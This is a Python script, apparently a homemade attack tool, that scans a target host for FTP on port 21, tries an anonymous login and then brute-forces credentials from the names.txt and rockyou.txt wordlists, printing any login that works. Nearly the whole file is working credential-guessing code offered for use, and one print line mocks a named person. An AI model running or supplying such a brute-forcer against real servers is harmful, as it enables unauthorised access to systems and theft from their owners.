import ftplib
import optparse
import socket
from socket import *
import os
import pexpect

global tgtPort
global userFile
global passFile


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def anonLogin(tgtHost):
    try:
        ftp = ftplib.FTP(tgtHost)
        ftp.login('anonymous', 'aa')
        print('\n[*]' + str(tgtHost) + ' FTP anon login success \n\n Enter USER:anonymous PASS:<any key>\n')
        os.system("ftp " + tgtHost)

    except Exception as e:
        print(bcolors.WARNING + '\n[!]' + str(tgtHost) + ' FTP anon login fail' + bcolors.FAIL)
      #  etTuBrute = input( bcolors.WARNING + "\n Would you like to bruteforce? [Y/n]" + bcolors.OKBLUE)
       # if etTuBrute is 'Y':
       #     return
      #  elif etTuBrute is 'n':
       #     print("BYE FELICIA")
       #     exit(0)
        bruteLogin(tgtHost)


userFile = '/usr/share/wordlists/dirb/others/names.txt'
passFile = '/usr/share/wordlists/rockyou.txt'


def bruteLogin(tgtHost):
    print('\n-----------attempting to bruteforce ---------')
    with open(userFile) as uF, open(passFile) as pF:
        for x, y in zip(uF.readlines(), pF.readlines()):
            user = x.strip()
            password = y.strip()
            print("[+] trying " + user + "/" + password)
            try:
                ftp = ftplib.FTP(tgtHost)
                ftp.login(user, password)
                print(bcolors.WARNING + "\n [*] FTP LOGIN SUCCESS : " + user + "/" + password + bcolors.OKGREEN)
                print("ZUZANNA SMELLS OF POOPOO")
               # ftp.quit()
                return
            except Exception as e:
                pass
        print("could not bruteforce, closing down :(")
        exit(0)


def connScan(tgtHost):
    tgtPort = 21
    try:
        connSkt = socket(AF_INET, SOCK_STREAM)
        connSkt.connect((tgtHost, tgtPort))
        results = connSkt.recv(200)
        print("[+]%d/tcp open" % tgtPort)
        print("[+]" + str(results))
        print("[-] attempting ftp anon login")
        connSkt.close()
        anonLogin(tgtHost)
    except Exception as e:
        print("[+]%d /tcp closed - no ftp available " % tgtPort)
        # bruteLogin(tgtHost)


def main():
    parser = optparse.OptionParser('usage %prog -H <target host> ')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target IP')
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    if tgtHost is None:
        print(parser.usage)
        exit(0)
    connScan(tgtHost)


userFile = '/usr/share/wordlists/dirb/others/names.txt'
passFile = '/usr/share/wordlists/rockyou.txt'

if __name__ == '__main__':
    main()
